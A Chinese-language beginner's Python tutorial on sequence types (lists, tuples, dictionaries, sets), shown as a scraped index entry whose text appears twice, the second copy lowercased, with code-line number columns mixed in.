二维列表可以帮助我们存储二维、表格的数据。二维数组的第一个维度中存储了二维度的列表起始地址。\n\na = [\n    [1,2,3,4],\n    [2,3,4,5],\n    [5,6,7,8],\n    [6,7,8,9]\n]\nprint(a)\n\n# 遍历a\nfor i in range(4):\n    for j in range(4):\n        print(a[i][j],end=\"\\t\")\n    print()\n    \n\"\"\"\n1\t2\t3\t4\t\n2\t3\t4\t5\t\n5\t6\t7\t8\t\n6\t7\t8\t9\t\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 元组\n\n元组和列表不一样，列表时可变的，可以修改删除增加。而元组一旦创建了就固定了，没有办法增删改。\n\n\n# 创建元组\n\n 1. 通过括号创建元组\n    \n    # 通过（）创建元组\n    a = (1,2,3,4)\n    b = 1,2,3,4\n    print(a) # (1, 2, 3, 4)\n    print(b) # (1, 2, 3, 4)\n    \n    # 如果元组中只有一个元素则必须加，\n    \n    a = (1)\n    print(type(a)) # <class 'int'>\n    a = (1,)\n    print(type(a)) # <class 'tuple'>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. 通过tuple创建元组\n    \n    a = tuple() # ()\n    b = tuple(\"abc\") # ('a', 'b', 'c')\n    c = tuple(range(5)) # (0, 1, 2, 3, 4)\n    d = tuple([1,2,3,4,5]) # (1, 2, 3, 4, 5)\n    print(a)\n    print(b)\n    print(c)\n    print(d)\n    \n    # tuple中可以接受列表、字符串、其他序列类型、迭代器等用于生成元组\n    # list中可以接受元组、字符串、其他序列类型、迭代器等用于生成列表\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n    3. 生成器推导式创建元组\n    \n    这里的生成器推导式和上面的列表推导式类似，生成器推导式使用小括号。列表推导式可以直接生成列表对象，而生成器推导式生成的是一个生成器对象。我们将生成器推导式使用tuple生成元组，或者使用__next__()进行遍历。元素访问之后就会被删除。\n    \n    s = (x*2 for x in range(10))\n    print(s) # <generator object <genexpr> at 0x7fafc00fdb60>\n    # print(list(s)) # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n    # print(tuple(s)) # (0, 2, 4, 6, 8, 10, 12, 14, 16, 18)\n    print(s.__next__()) # 0\n    print(s.__next__()) # 2\n    print(list(s)) # [4, 6, 8, 10, 12, 14, 16, 18]\n    print(tuple(s)) # ()\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n\n# 元素访问和计数\n\n元组中的元素无法修改，如果修改则会报错。\n\na = tuple(range(10))\nprint(a[2]) # 2\na[2] = 3 # TypeError: 'tuple' object does not support item assignment\n\n\n1\n2\n3\n\n\n元组的切片和列表一样，返回的是元组切片。使用内置的sorted方法可以对生成元组的新的排序之后的列表对象。\n\na = tuple(range(10))\n\nprint(a[:8]) # (0, 1, 2, 3, 4, 5, 6, 7)\nprint(a[4:]) # (4, 5, 6, 7, 8, 9)\nprint(a[4:8]) # (4, 5, 6, 7)\nprint(a[4:8:2]) # (4, 6)\nprint(a[::-1]) # (9, 8, 7, 6, 5, 4, 3, 2, 1, 0)\nprint(a[-8:-2]) # (2, 3, 4, 5, 6, 7)\n\nb = sorted(a,reverse=True)\nprint(b) # [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nzip函数可以将多个列表对应位置的元素组合成为元组，并返回zip对象。\n\na = [1,2,3]\nb = [4,5,6]\nc = [7,8,9]\nd = zip(a,b,c)\nprint(d)  # <zip object at 0x7fa930060540>\nprint(list(d))  # [(1, 4, 7), (2, 5, 8), (3, 6, 9)]\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 字典\n\nPython中的字典类似于Java中的Map类型。字典是键值对的无序可变的序列，字典中的元素都是一个个的键值对。在字典中，可以通过指定的键定位到值对象。键是任意的不可变对象，如整数、浮点数、元组等等，列表、字典、集合等不可作为键。字典的定义方式如下：\n\na = {'hello':'world','time':'2022-11-22',12:'age'}\n\n\n1\n\n\n\n# 创建字典\n\n 1. 通过大括号创建字典\n    \n    # {} 创建字典\n    a = {'name':'zhangsan','age':12,11:12}\n    print(type(a)) # <class 'dict'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. 通过dict()创建字典\n    \n    # dict创建字典\n    a = dict(name='zhangsan',age=12)\n    b = dict([('name','zhangsan'),('age',12),(12,22)])\n    c = {}\n    d = dict()\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    print(b) # {'name': 'zhangsan', 'age': 12, 12: 22}\n    print(c) # {}\n    print(d) # {}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 3. 通过zip()创建字典\n    \n    k = ['name','age',12]\n    v = ['zhangsan','12',22]\n    d = dict(zip(k,v))\n    print(d)  # {'name': 'zhangsan', 'age': '12', 12: 22}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 通过fromkeys创建空值字典\n    \n    a = dict.fromkeys(['name','age',12])\n    print(a)\n    \n    \n    1\n    2\n    \n\n\n# 字典元素的访问\n\na = {'name':'zhangsan','age':18,'job':'IT'}\nprint(a['name']) # zhangsan\n# print(a['sex'])  # KeyError: 'sex'\n\nprint(a.get('name')) # zhangsan\nprint(a.get('sex')) # None\nprint(a.get('sex','nan')) # nan 返回一个默认值\n\nprint(a.items()) # dict_items([('name', 'zhangsan'), ('age', 18), ('job', 'IT')])\n\nprint(a.keys()) # dict_keys(['name', 'age', 'job'])\nprint(a.values()) # dict_values(['zhangsan', 18, 'IT'])\n\nprint(len(a)) # 3\nprint('name' in a) # True\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 字典增删改\n\n 1. 新增键值对，存在则覆盖\n    \n    a = {'name':'zhangsan','age':12,'sex':True}\n    a['birth'] = '2022-12-22'\n    print(a) # {'name': 'zhangsan', 'age': 12, 'sex': True, 'birth': '2022-12-22'}\n    a['name']='lisi'\n    print(a) # {'name': 'lisi', 'age': 12, 'sex': True}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. update将新字典覆盖到旧字典上\n    \n    a = {'name':'zhangsan','age':12,'sex':True}\n    b = {'name':'wangwu','age':20,'sex':True,'birth':'20202222'}\n    a.update(b)\n    print(a) # {'name': 'wangwu', 'age': 20, 'sex': True, 'birth': '20202222'}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. del方法删除键值对\n    \n    a = {'name':'zhangsan','age':12,'sex':True}\n    \n    del a['name']\n    print(a) # {'age': 12, 'sex': True}\t\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. clear方法删除所有键值对\n    \n    a.clear()\n    print(a) # {}\n    \n    \n    1\n    2\n    \n\n 5. pop删除指定键值对\n    \n    b = a.pop(\"name\")\n    print(b) # zhangsan\n    print(a) # {'age': 12, 'sex': True}\n    \n    \n    1\n    2\n    3\n    \n\n 6. popitem随检删除返回键值对\n    \n    b = a.popitem()\n    print(b) # ('sex', True)\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    \n    \n    1\n    2\n    3\n    \n\n\n# 语法糖 之 序列解包\n\n序列解包可以很方便的帮助我们同时给多个变量赋值。可以作用于元组、列表、字典之上。\n\nx,y,z = (1,2,3)\nprint(x,y,z) # 1 2 3\n\n(a,b,c) = (3,4,5)\nprint(a,b,c) # 3 4 5\n\n[a,b,c,d] = [1,2,2,3]\nprint(a,b,c,d) # 1 2 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n序列解包同时可以作用于字典之上，如果是字典，则默认是key\n\na = {'name':'zhngsan','age':12,'sex':True}\nx,y,z = a\nprint(x,y,z) # name age sex\n\n\n1\n2\n3\n\n\n可以使用字典的items和values获取到键值对序列\n\na = {'name':'zhngsan','age':12,'sex':True}\n\nx,y,z = a.items()\nprint(x,y,z) # ('name', 'zhngsan') ('age', 12) ('sex', True)\nx,y,z = a.values()\nprint(x,y,z) # zhngsan 12 True\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 列表结合字典存储和访问数据\n\n姓名    年龄   薪资      城市\n高小一   18   30000   北京\n高小二   19   20000   上海\n高小五   20   10000   深圳\n\nr1 = {\"name\":\"高小一\",\"age\":18,\"salary\":30000,\"city\":\"北京\"}\nr2 = {\"name\":\"高小二\",\"age\":19,\"salary\":20000,\"city\":\"上海\"}\nr3 = {\"name\":\"高小五\",\"age\":20,\"salary\":10000,\"city\":\"深圳\"}\ntb = [r1,r2,r3]\n\n#获得第二行的人的薪资\nprint(tb[1].get(\"salary\"))\n#打印表中所有的的薪资\nfor i in range(len(tb)):\n  print(tb[i].get(\"salary\"))\n#打印表的所有数据 for i in range(len(tb)):\n  print(tb[i].get(\"name\"),tb[i].get(\"age\"),tb[i].get(\"salary\"),tb[i].get(\"city\"))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 字典底层原理\n\n字典的核心就是散列表，散列表是一个稀疏数组，数组的单元称为bucket。每个bucket包含两个部分，一个是键的引用，一个是值的引用。\n\n# 如何将一个键值对存储到字典中\n\n首先是创建一个字典，为字典分配内存空间，这里为方便计算，采用长度为8。然后获取到这个键值对的key的hash值，然后，因为数组的长度为8，我们取右边3位偏移量，转化为对应的十进制数据，然后查看偏移量5对应的数组位置上是不是空的，如果是，则将键值对放入。如果不是则再向右取三位偏移量。直到发现空的bucket。\n\n# 如何根据键查找值\n\n当我们需要查找值的时候，首先是获取到键的hash，如果数组长度为8，则获取右3位作为偏移量，然后查看对应的位置是否为空。如果为空则返回None。如果不是空，计算这个bucket的key的hash，比较是否和当前查询的键的hash一致。如果一致则返回值。如果不一致，则继续向右取三位进行比较，直到最后，如果没有发现，返回None。\n\n\n# 集合\n\n集合是无序的可变序列，但是元素不能重复。类似于Java中的set。集合底层是通过字典实现的。集合的所有元素都是字典的键，因此不可重复。\n\n\n# 集合的相关操作\n\n 1. 使用大括号创建集合\n    \n    a = {1,2,3,'hello'}\n    print(a) #  {1, 2, 3, 'hello'}\n    print(type(a)) # <class 'set'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. 使用set创建集合\n    \n    a = [1,2,2,2,3,4]\n    b = set(a)\n    print(b) # {1, 2, 3, 4}\n    \n    \n    1\n    2\n    3\n    \n\n 3. 使用add添加元素\n    \n    a = {}\n    print(type(a)) # <class 'dict'>\n    a = set()\n    print(type(a)) # <class 'set'>\n    a.add(1)\n    a.add(1)\n    print(a) # {1}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. 使用remove删除元素\n    \n    a = {1,2,3,4,5,6}\n    a.remove(1)\n    a.remove(2)\n    # a.remove(7) # KeyError: 7\n    print(a) # {3, 4, 5, 6}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 5. 使用clear清空集合\n    \n    a = {1,2,3,4,5}\n    a.clear()\n    print(a) # set()\n    \n    \n    1\n    2\n    3\n    \n\n 6. 集合的交差并操作\n    \n    a = {1,2,3,4}\n    b = {3,4,5,6}\n    print(a|b) # 并 # {1, 2, 3, 4, 5, 6}\n    print(a&b) # 交 # {3, 4}\n    print(a - b) # 差 # {1, 2}\n    \n    print(a.union(b))# 并 # {1, 2, 3, 4, 5, 6}\n    print(a.intersection(b))# 交 # {3, 4}\n    print(a.difference(b))# 差 # {1, 2}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n\n# 参考资料\n\n尚学堂Python教程：https://www.bjsxt.com",normalizedContent:"# python序列的那些事\n\n> 接上一篇的《python字符串的那些事》，这篇准备整理一下 python 中的序列类型的基础用法，包含：字符串、列表、元组、字典、集合。后续有相关的深入了解，也会更新到这里。字符串在上一篇说过，这里就不再赘述。\n\n\n# 列表\n\n列表是可以存储 任意数目、任意类型的数据集合。列表内置了可变的序列，包含多个元素的 有序且连续的 内存空间。定义方式如：a = [1,2,3,4]。其中1、2、3、4为列表a的元素，元素中存储的数据类型可以任意，不比一定相同。列表有如下的一些常用方法：\n\n方法                     要点       描述\nlist.append(x)         增加元素     将元素 x 增加到列表 list 尾部\nlist.extend(alist)     增加元素     将列表 alist 所有元素加到列表 list 尾部\nlist.insert(index,x)   增加元素     在列表 list 指定位置 index 处插入元素 x\nlist.remove(x)         删除元素     在列表 list 中删除首次出现的指定元素 x\nlist.pop([index])      删除元素     删除并返回列表 list 指定为止 index 处的元素，默认是 最后一个元素\nlist.clear()           删除所有元素   删除列表所有元素，并不是删除列表对象\nlist.index(x)          访问元素     返回第一个 x 的索引位置，若不存在 x 元素抛出异常\nlist.count(x)          计数       返回指定元素 x 在列表 list 中出现的次数\nlen(list)              列表长度     返回列表中包含元素的个数\nlist.reverse()         翻转列表     所有元素原地翻转\nlist.sort()            排序       所有元素原地排序\nlist.copy()            浅拷贝      返回列表对象的浅拷贝\n\n字符串和列表类似，都是序列的类型。字符串存储的是相同字符类型的序列，而列表是存储任意类型的序列。因此，字符串的一些用法在列表上也是一样的。\n\n\n# 创建列表\n\n创建列表有多种方式，这里整理了四种：\n\n 1. 基本的创建方式\n    \n    a = [1,2,3,\"hello\",\"world\",true]\n    a = [] # 创建空列表\n    \n    \n    1\n    2\n    \n\n 2. 使用list() 创建\n    \n    a = list() # 创建空列表\n    a = list(1,2,3,\"aaa\",true)\n    \n    \n    1\n    2\n    \n\n 3. 使用range() 创建\n    \n    # range可以帮助我们创建整数数组，这在for循环中有大用处。\n    # range语法格式为：range(start,end,step)\n    # start: 可选，起始位置，默认为0\n    # end: 必选，结束位置\n    # step ： 步长，可选，默认为1\n    \n    # 在python3 中range返回一个range对象，而不是一个列表，我们需要通过list方法将其转化为列表\n    \n    a = range(5)\n    print(a) # range(0, 5)\n    b = list(range(5))\n    print(b) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 4. 使用推导式生成列表\n    \n    # 使用for推导式的方式生成数组，在开发中也比较常见。\n    # 基本的使用方式如下：\n    a = [x*2 for x in range(5)]\n    print(a) # [0, 2, 4, 6, 8]\n    \n    b = [x*2 for x in range(100) if x%10 == 0]\n    print(b) # [0, 20, 40, 60, 80, 100, 120, 140, 160, 180]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n\n# 新增元素\n\n列表是一个可变的序列，如果出现新增和删除元素时，python会自动进行内存管理，极大的减少了程序员的负担。但是因为是连续的有序内存空间，所以在一些位置插入删除元素效率比较低，我们通常在列表尾部删除和插入元素。\n\n 1. append() 表尾添加元素\n    \n    a = [1,2]\n    a.append(3)\n    print(a)\n    \n    \n    1\n    2\n    3\n    \n\n 2. +运算符操作\n    \n    # + 运算符 并不是真正的往尾部添加元素，而是创建新对象将原列表复制到新列表中，效率太低\n    a = [1,2]\n    print(id(a)) # 140213503386560\n    a = a+[3,4]\n    print(id(a)) # 140213234351808\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. extend() 拓展列表\n    \n    # extend 完成两个列表的拼接，不产生新对象\n    a = [1,2]\n    print(id(a)) # 140335909954496\n    b = [3,4]\n    a.extend(b)\n    print(a) # [1, 2, 3, 4]\n    print(id(a)) # 140335909954496\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. insert() 插入元素\n    \n    # insert 可以在任意位置插入元素，但是这样会导致元素的移动，效率较低，避免在列表头部插入元素\n    a = [1,2,3,4]\n    a.insert(0,0)\n    print(a) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. 乘法复制\n    \n    # 乘法拓展 这比较的神奇 如果想复制一个列表，只需要使用乘法\n    # 在字符串中，同样可以使用乘法的方式复制字符串\n    \n    a = [\"zhangsan\",22]\n    b = a*3\n    print(b) # ['zhangsan', 22, 'zhangsan', 22, 'zhangsan', 22]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n\n# 删除元素\n\n在列表中的删除也会导致元素的移动，因此尽量避免非尾部元素的删除，会导致效率太低。\n\n 1. del删除\n    \n    # del 删除指定位置的元素\n    a = [1,2,3,4]\n    del a[1] # [1, 3, 4]\n    print(a)\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. pop出栈\n    \n    # pop出栈 默认从末尾删除，返回值为删除的元素；也可以传递index\n    a = [1,2,3,4]\n    b = a.pop(0)\n    print(a)\n    print(b)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. remove删除\n    \n    # remove 指定元素删除，删除第一个出现该元素的位置\n    a = [1,2,3,4]\n    a.remove(2)\n    print(a) # [1, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 查看元素\n\npython中的列表相对于java中的数组，都可以通过idnex去访问一个元素。但是java中的数组长度不可变，并且不可以存储任意的类型。\n\n 1. 通过索引访问元素\n    \n    # 通过索引访问元素 从0开始到len-1\n    a = [2,3,1,4,6,32,2,5,7,2]\n    print(a[0]) # 2\n    print(a[len(a)]) # 索引越界 indexerror: list index out of range\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. index() 获取元素的索引\n    \n    # index可以查找第一次出现某个元素的index，可以传入一个范围，使用的方式是：a.index(value,[start],[end])\n    a = [1,2,3,4,5,6,7,8,9,10]\n    print(a.index(1)) # 0\n    print(a.index(3,1,5)) # 2\n    print(a.index(11)) # valueerror: 11 is not in list\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. count() 获取元素出现的次数\n    \n    # count用于判断元素在列表中出现的次数,如果结果为0 则表示列表中没有这个元素\n    a = [1,2,3,3,3,4,3,2,1]\n    print(a.count(1)) # 2\n    print(a.count(10)) # 0\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. len() 获取列表的长度\n    \n    # len 和字符串一样，len可以获取列表的长度\n    a = [1,2,3,4,5,6,7]\n    print(len(a)) # 7\n    \n    \n    1\n    2\n    3\n    \n\n 5. 判断列表中存在指定元素\n    \n    # 上面说如果一个元素的count不等于0 则该元素不在列表中。\n    # 还可以通过in进行简便判断\n    a = [1,2,3,5,6,7,8,9]\n    print(a.count(4) == 0) # true\n    print(4 in a) # false\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 6. 遍历列表的内容\n    \n    # 使用for循环遍历\n    a = [1,2,3,4,5,6,7]\n    for x in a:\n        print(x,end=\",\") # 1,2,3,4,5,6,7,\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 7. 列表排序\n    \n    # sort 排序 默认生序 降序则reverse=true  不新建列表，修改原列表\n    # 乱序 shuffle\n    \n    a = [1,3,2,4,5,2,6,8,10]\n    a.sort()\n    print(a) # [1, 2, 2, 3, 4, 5, 6, 8, 10]\n    a.sort(reverse=true)\n    print(a) # [10, 8, 6, 5, 4, 3, 2, 2, 1]\n    \n    import random\n    random.shuffle(a)\n    print(a) # [6, 5, 2, 4, 3, 10, 1, 8, 2]\n    \n    # sorted 创建新列表，不修改原列表\n    a = [20,10,30,40,22]\n    b = sorted(a)\n    print(a) # [20, 10, 30, 40, 22]\n    print(b) # [10, 20, 22, 30, 40]\n    \n    b = sorted(a,reverse=true)\n    print(b) # [40, 30, 22, 20, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 8. 列表迭代器\n    \n    # 存在一个内置函数reversed也可以对列表进行逆序，但是返回的是一个迭代器。\n    a = [10,2,11,9,13,22]\n    c = reversed(a)\n    print(c) # <list_reverseiterator object at 0x7fd528043fa0>\n    print(list(c))  # [22, 13, 9, 11, 2, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 9. 列表复制\n    \n    # = 复制地址，list1和list2指向同一个地址\n    list1 = [1,2,3,4]\n    list2 = list1\n    \n    list2[0] = 0\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [0, 2, 3, 4]\n    \n    # 拼空列表复制\n    list2 = []+list1\n    list2[0] = 10\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [10, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n\n# 列表切片[]\n\n切片是python中的重要操作，同时也适用于列表、元组、字符串。切片常见的语法格式是：\n\na[start:end:step]\n\n典型的操作如下：\n\n操作和说明                                       示例                               结果\n[:]提取整个列表                                   [10,20,30][:]                    [10,20,30]\n[start:]从 start 索引开始到 结尾                    [10,20,30][1:]                   [20,30]\n[:end]从头开始知道 end-1                          [10,20,30][:2]                   [10,20]\n[start:end]从 start 到 end-1                  [10,20,30,40][1:3]               [20,30]\n[start🔚step] 从 start 提 取到 end-1，步长是 step   [10,20,30,40,50,60,70][1:6: 2]   [20, 40, 60]\n[10,20,30,40,50,60,70][-3:]                 倒数三个                             [50,60,70]\n[10,20,30,40,50,60,70][-5:-3]               倒数第五个到倒数 第三个(包头不包尾)              [30,40]\n[10,20,30,40,50,60,70][::-1]                步长为负，从右到左 反向提取                   [70, 60, 50, 40, 30, 20, 10]\n\n切片操作时如果索引越界了也不会报错，如果start小于0会被看作0，如果end大于len-1会被看作len-1。\n\n\n# 其他列表函数\n\n 1. 求最大最小值\n    \n    # max 和 min用于求列表中的最大最小值\n    a = [1,2,3,4,5,6]\n    print(max(a)) # 6\n    print(min(a)) # 1\n    a = [1,\"a\",true]\n    print(max(a))\n    print(min(a)) # 不同类型元素比较会报错\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 2. 元素求和\n    \n    a = [1,2,3,4,5,6,7,8]\n    print(sum(a)) # 36\n    a = ['a',1,2,3,true]\n    print(sum(a)) # typeerror: unsupported operand type(s) for +: 'int' and 'str'\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 多维列表\n\n一维列表可以帮助我们存储一维、线性的数据。 二维列表可以帮助我们存储二维、表格的数据。二维数组的第一个维度中存储了二维度的列表起始地址。\n\na = [\n    [1,2,3,4],\n    [2,3,4,5],\n    [5,6,7,8],\n    [6,7,8,9]\n]\nprint(a)\n\n# 遍历a\nfor i in range(4):\n    for j in range(4):\n        print(a[i][j],end=\"\\t\")\n    print()\n    \n\"\"\"\n1\t2\t3\t4\t\n2\t3\t4\t5\t\n5\t6\t7\t8\t\n6\t7\t8\t9\t\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 元组\n\n元组和列表不一样，列表时可变的，可以修改删除增加。而元组一旦创建了就固定了，没有办法增删改。\n\n\n# 创建元组\n\n 1. 通过括号创建元组\n    \n    # 通过（）创建元组\n    a = (1,2,3,4)\n    b = 1,2,3,4\n    print(a) # (1, 2, 3, 4)\n    print(b) # (1, 2, 3, 4)\n    \n    # 如果元组中只有一个元素则必须加，\n    \n    a = (1)\n    print(type(a)) # <class 'int'>\n    a = (1,)\n    print(type(a)) # <class 'tuple'>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. 通过tuple创建元组\n    \n    a = tuple() # ()\n    b = tuple(\"abc\") # ('a', 'b', 'c')\n    c = tuple(range(5)) # (0, 1, 2, 3, 4)\n    d = tuple([1,2,3,4,5]) # (1, 2, 3, 4, 5)\n    print(a)\n    print(b)\n    print(c)\n    print(d)\n    \n    # tuple中可以接受列表、字符串、其他序列类型、迭代器等用于生成元组\n    # list中可以接受元组、字符串、其他序列类型、迭代器等用于生成列表\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n    3. 生成器推导式创建元组\n    \n    这里的生成器推导式和上面的列表推导式类似，生成器推导式使用小括号。列表推导式可以直接生成列表对象，而生成器推导式生成的是一个生成器对象。我们将生成器推导式使用tuple生成元组，或者使用__next__()进行遍历。元素访问之后就会被删除。\n    \n    s = (x*2 for x in range(10))\n    print(s) # <generator object <genexpr> at 0x7fafc00fdb60>\n    # print(list(s)) # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n    # print(tuple(s)) # (0, 2, 4, 6, 8, 10, 12, 14, 16, 18)\n    print(s.__next__()) # 0\n    print(s.__next__()) # 2\n    print(list(s)) # [4, 6, 8, 10, 12, 14, 16, 18]\n    print(tuple(s)) # ()\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n\n# 元素访问和计数\n\n元组中的元素无法修改，如果修改则会报错。\n\na = tuple(range(10))\nprint(a[2]) # 2\na[2] = 3 # typeerror: 'tuple' object does not support item assignment\n\n\n1\n2\n3\n\n\n元组的切片和列表一样，返回的是元组切片。使用内置的sorted方法可以对生成元组的新的排序之后的列表对象。\n\na = tuple(range(10))\n\nprint(a[:8]) # (0, 1, 2, 3, 4, 5, 6, 7)\nprint(a[4:]) # (4, 5, 6, 7, 8, 9)\nprint(a[4:8]) # (4, 5, 6, 7)\nprint(a[4:8:2]) # (4, 6)\nprint(a[::-1]) # (9, 8, 7, 6, 5, 4, 3, 2, 1, 0)\nprint(a[-8:-2]) # (2, 3, 4, 5, 6, 7)\n\nb = sorted(a,reverse=true)\nprint(b) # [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nzip函数可以将多个列表对应位置的元素组合成为元组，并返回zip对象。\n\na = [1,2,3]\nb = [4,5,6]\nc = [7,8,9]\nd = zip(a,b,c)\nprint(d)  # <zip object at 0x7fa930060540>\nprint(list(d))  # [(1, 4, 7), (2, 5, 8), (3, 6, 9)]\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 字典\n\npython中的字典类似于java中的map类型。字典是键值对的无序可变的序列，字典中的元素都是一个个的键值对。在字典中，可以通过指定的键定位到值对象。键是任意的不可变对象，如整数、浮点数、元组等等，列表、字典、集合等不可作为键。字典的定义方式如下：\n\na = {'hello':'world','time':'2022-11-22',12:'age'}\n\n\n1\n\n\n\n# 创建字典\n\n 1. 通过大括号创建字典\n    \n    # {} 创建字典\n    a = {'name':'zhangsan','age':12,11:12}\n    print(type(a)) # <class 'dict'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. 通过dict()创建字典\n    \n    # dict创建字典\n    a = dict(name='zhangsan',age=12)\n    b = dict([('name','zhangsan'),('age',12),(12,22)])\n    c = {}\n    d = dict()\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    print(b) # {'name': 'zhangsan', 'age': 12, 12: 22}\n    print(c) # {}\n    print(d) # {}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 3. 通过zip()创建字典\n    \n    k = ['name','age',12]\n    v = ['zhangsan','12',22]\n    d = dict(zip(k,v))\n    print(d)  # {'name': 'zhangsan', 'age': '12', 12: 22}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 通过fromkeys创建空值字典\n    \n    a = dict.fromkeys(['name','age',12])\n    print(a)\n    \n    \n    1\n    2\n    \n\n\n# 字典元素的访问\n\na = {'name':'zhangsan','age':18,'job':'it'}\nprint(a['name']) # zhangsan\n# print(a['sex'])  # keyerror: 'sex'\n\nprint(a.get('name')) # zhangsan\nprint(a.get('sex')) # none\nprint(a.get('sex','nan')) # nan 返回一个默认值\n\nprint(a.items()) # dict_items([('name', 'zhangsan'), ('age', 18), ('job', 'it')])\n\nprint(a.keys()) # dict_keys(['name', 'age', 'job'])\nprint(a.values()) # dict_values(['zhangsan', 18, 'it'])\n\nprint(len(a)) # 3\nprint('name' in a) # true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 字典增删改\n\n 1. 新增键值对，存在则覆盖\n    \n    a = {'name':'zhangsan','age':12,'sex':true}\n    a['birth'] = '2022-12-22'\n    print(a) # {'name': 'zhangsan', 'age': 12, 'sex': true, 'birth': '2022-12-22'}\n    a['name']='lisi'\n    print(a) # {'name': 'lisi', 'age': 12, 'sex': true}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. update将新字典覆盖到旧字典上\n    \n    a = {'name':'zhangsan','age':12,'sex':true}\n    b = {'name':'wangwu','age':20,'sex':true,'birth':'20202222'}\n    a.update(b)\n    print(a) # {'name': 'wangwu', 'age': 20, 'sex': true, 'birth': '20202222'}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. del方法删除键值对\n    \n    a = {'name':'zhangsan','age':12,'sex':true}\n    \n    del a['name']\n    print(a) # {'age': 12, 'sex': true}\t\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. clear方法删除所有键值对\n    \n    a.clear()\n    print(a) # {}\n    \n    \n    1\n    2\n    \n\n 5. pop删除指定键值对\n    \n    b = a.pop(\"name\")\n    print(b) # zhangsan\n    print(a) # {'age': 12, 'sex': true}\n    \n    \n    1\n    2\n    3\n    \n\n 6. popitem随检删除返回键值对\n    \n    b = a.popitem()\n    print(b) # ('sex', true)\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    \n    \n    1\n    2\n    3\n    \n\n\n# 语法糖 之 序列解包\n\n序列解包可以很方便的帮助我们同时给多个变量赋值。可以作用于元组、列表、字典之上。\n\nx,y,z = (1,2,3)\nprint(x,y,z) # 1 2 3\n\n(a,b,c) = (3,4,5)\nprint(a,b,c) # 3 4 5\n\n[a,b,c,d] = [1,2,2,3]\nprint(a,b,c,d) # 1 2 2 